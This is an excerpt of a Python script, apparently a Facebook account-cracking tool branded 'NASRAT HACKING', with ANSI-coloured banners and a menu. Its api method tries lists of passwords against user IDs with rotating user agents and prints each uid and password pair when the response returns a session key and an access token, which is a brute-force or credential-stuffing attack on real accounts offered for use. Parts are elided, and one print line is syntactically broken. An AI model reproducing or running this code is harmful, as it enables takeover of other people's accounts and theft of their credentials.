#THE TOOL CREATED By Nasrat
#BD Cyber Nasrat
#FB : https://https://www.facebook.com/profile.php?id=100001358458659
#Programer Nasrat
#𝐖𝐇𝐀𝐓'𝐒 𝐀𝐏𝐏 : +923142976820
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
...
\33[1;32m𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 NASRAT HACKING

\33[1;34m✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨


╔════════════════════════════════════════╗
║\33[1;32m[↦] 𝙰𝚄𝚃𝙷𝙾𝚁     : Nasrat
║\33[1;32m[↦] 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺   : Loy rayess kabul
║\33[1;32m[↦] 𝙶𝙸𝚃𝙷𝚄𝙱     : git clone https://github.com/Nasrat99845/git
║\33[1;32m[↦] 𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙   : +923142976820
║\33[1;32m[↦] 𝚂𝚝𝚊𝚝𝚞𝚜     : 𝙵𝚛𝚎𝚎
║\33[1;32m[↦] 𝚃𝙴𝙰𝙼       : NASRAT
...
class Main:
	def __init__(self):
		...
		if syed in ["", " "]:
			...
			os.system('xdg-open https://www.facebook.com/profile.php?id=100093081651852')
			print("")
			time.sleep(2.0)
			print("\033[1;33m   This Is SKINGTECH")
			print("")
			input("\n\033[1;32m   ENTER MY FACEBOOK PAGE NAME  ==> \033[1;36m")
			time.sleep(2.1)
			print("")
			print("\033[1;32m  Successful Bro Please W8...")
			print("\033[1;32m  The Tool Created By NASRAT HACK)
			time.sleep(2.0)
			os.system("clear")
		print(logo)
		print("\033[0;90m╔══════════════════════════════════════════════════════════╗")
		...
		if DEVIL in ["1", "01"]:
			self.fbtua()
		if DEVIL in ["2", "02"]:
			os.system('xdg-open https://github.com/Nasrat99845/git      ')
		if DEVIL in ["3", "03"]:
			os.system('xdg-open https://www.facebook.com/profile.php?id=100000400628720 /')
		if DEVIL in ["4", "04"]:
			os.system('xdg-open https://facebook.com/groups/1274977463457314//')
		if DEVIL in ["5",  "05"]:
			self.old2()
			exit()
		else:
	...
	def fbtua(self):
		...
		try:
			...
			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks For Using NASRAT Tools.")
		except Exception as e:exit(str(e))
 
	def api(self, uid, pwx):
		ua = random.choice(ugen)	
		sys.stdout.write(
			"\r\r %s\033[92;1m[SKING] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;32m   [SKING] %s | %s\033[1;32m         "%(uid, pw))
